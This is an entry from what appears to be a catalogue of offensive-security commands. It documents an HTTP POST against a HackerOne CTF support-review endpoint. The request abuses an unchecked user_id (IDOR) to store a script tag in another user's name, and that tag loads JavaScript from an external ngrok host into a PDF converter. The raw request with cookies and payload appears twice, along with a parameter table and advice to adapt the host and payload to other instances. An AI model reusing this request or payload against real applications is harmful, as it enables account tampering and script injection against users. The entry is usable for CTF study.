---
data: >-
  POST
  /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587
  HTTP/1.1

  Host: h1-415.h1ctf.com

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101
  Firefox/70.0

  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Referer:
  https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 135

  Origin: https://h1-415.h1ctf.com

  Connection: close

  Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee;
  session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs

  Upgrade-Insecure-Requests: 1


  name=<script
  src="https://8a7b2695.ngrok.io/static/js/new.js"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee
tags:
  - idor
  - http-post
type: command
output: 'Updates user''s name to include XSS, triggering in PDF converter'
executor: http
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.008Z'
id: 7a725187-fde0-4423-86d0-b44a65131a57
verified: false
validated: true
submitted: true
---
# post-support-review-idor

## Command

```http
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Connection: close
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs
Upgrade-Insecure-Requests: 1

name=<script src="https://8a7b2695.ngrok.io/static/js/new.js"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee
```

## Description

HTTP POST request exploiting IDOR to update a target user's name with an XSS payload via the support review endpoint, lacking authorization on user_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| name | XSS script tag payload | Yes |
| user_id | Target user ID (e.g., 18) | Yes |
| _csrf_token | CSRF protection token | Yes |

## Examples

### Basic Usage

Use curl or browser dev tools to send the POST with provided headers and body.

### Advanced Usage

Adapt review_id, host, and payload for different instances.

## Expected Output

HTTP 200 OK with updated user data; no error on unauthorized user_id.

## Related

- [[procedures/IDOR-to-Inject-XSS-into-User-Name-for-PDF-Converter]]
- [[commands/create-iframe-ssrf-chrome]]
